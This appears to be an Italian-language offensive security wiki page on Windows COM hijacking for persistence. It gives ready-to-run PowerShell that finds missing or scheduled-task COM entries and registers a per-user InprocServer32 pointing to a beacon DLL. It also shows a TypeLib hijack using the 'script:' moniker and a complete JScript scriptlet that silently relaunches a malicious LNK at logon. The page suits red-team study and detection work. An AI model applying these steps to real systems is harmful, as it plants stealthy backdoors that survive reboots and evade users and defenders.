# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Ricerca di componenti COM inesistenti

Poiché i valori di HKCU possono essere modificati dagli utenti, **COM Hijacking** può essere usato come **meccanismo persistente**. Usando `procmon` è facile trovare voci del registro COM cercate che non esistono, che un attaccante potrebbe creare per ottenere persistenza. Filtri:

- **RegOpenKey** operations.
- dove il _Result_ è **NAME NOT FOUND**.
- e il _Path_ termina con **InprocServer32**.

Una volta deciso quale COM inesistente impersonare, esegui i seguenti comandi. _Fai attenzione se decidi di impersonare un COM che viene caricato ogni pochi secondi, perché potrebbe essere eccessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks usano Custom Triggers per chiamare COM objects e, poiché vengono eseguiti tramite il Task Scheduler, è più facile prevedere quando verranno attivati.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Controllando l'output puoi selezionarne uno che verrà eseguito, ad esempio, **ogni volta che un utente effettua il login**.

Ora cercando il CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** e in HKLM e HKCU, di solito scoprirai che il valore non esiste in HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
A quel punto, puoi semplicemente creare la voce HKCU e, ogni volta che l'utente effettua il login, il tuo backdoor verrà eseguito.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definiscono le interfacce COM e vengono caricate tramite `LoadTypeLib()`. Quando un server COM viene istanziato, il sistema operativo può anche caricare il TypeLib associato consultando le chiavi di registro sotto `HKCR\TypeLib\{LIBID}`. Se il percorso del TypeLib viene sostituito con un **moniker**, ad es. `script:C:\...\evil.sct`, Windows eseguirà lo scriptlet quando il TypeLib verrà risolto – producendo una persistenza furtiva che si attiva quando vengono utilizzati componenti comuni.

Questo è stato osservato contro il Microsoft Web Browser control (spesso caricato da Internet Explorer, da app che incorporano WebBrowser e persino da `explorer.exe`).

### Passaggi (PowerShell)

1) Identifica il TypeLib (LIBID) utilizzato da un CLSID ad alta frequenza. Esempio di CLSID spesso abusato dalle catene malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Puntare il percorso TypeLib per utente a uno scriptlet locale usando il moniker `script:` (non sono richiesti privilegi di amministratore):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Posiziona un file JScript `.sct` minimo che rilancia il tuo payload principale (es. una `.lnk` usata dalla catena iniziale):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Attivazione – l'apertura di IE, un'applicazione che incorpora il WebBrowser control, o anche la normale attività di Explorer caricherà la TypeLib ed eseguirà lo scriptlet, riarmando la tua chain al logon/reboot.

Pulizia
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Note
- Puoi applicare la stessa logica ad altri componenti COM di uso frequente; risolvi sempre prima il vero `LIBID` da `HKCR\CLSID\{CLSID}\TypeLib`.
- Su sistemi 64-bit puoi anche popolare la sottochiave `win64` per i consumatori a 64-bit.

## Riferimenti

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
